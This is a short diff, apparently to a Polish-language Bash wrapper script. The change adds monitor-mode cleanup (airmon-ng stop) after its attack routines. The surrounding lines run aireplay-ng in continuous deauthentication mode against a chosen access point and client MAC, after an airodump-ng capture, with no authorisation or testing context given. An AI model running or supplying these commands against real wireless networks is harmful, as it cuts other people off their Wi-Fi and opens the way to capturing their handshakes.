@@ -26,6 +26,7 @@ do
   clear
   sudo aireplay-ng -0 0 -a $BSSID -c $MAC wlan0mon
   echo "Dziękuje za skorzystanie ze skryptu !" 
+  sudo airmon-ng stop wlan0mon
  break
  ;;
      [2][oO]|[2])
@@ -41,7 +42,8 @@ do
   sudo airodump-ng -d $BSSID -c $CH wlan0mon
   clear
   sudo aireplay-ng -0 0 -a $BSSID wlan0mon
-  echo "Dziękuje za skorzystanie ze skryptu !" 
+  echo "Dziękuje za skorzystanie ze skryptu !"
+  sudo airmon-ng stop wlan0mon
  break
  ;;
      *)
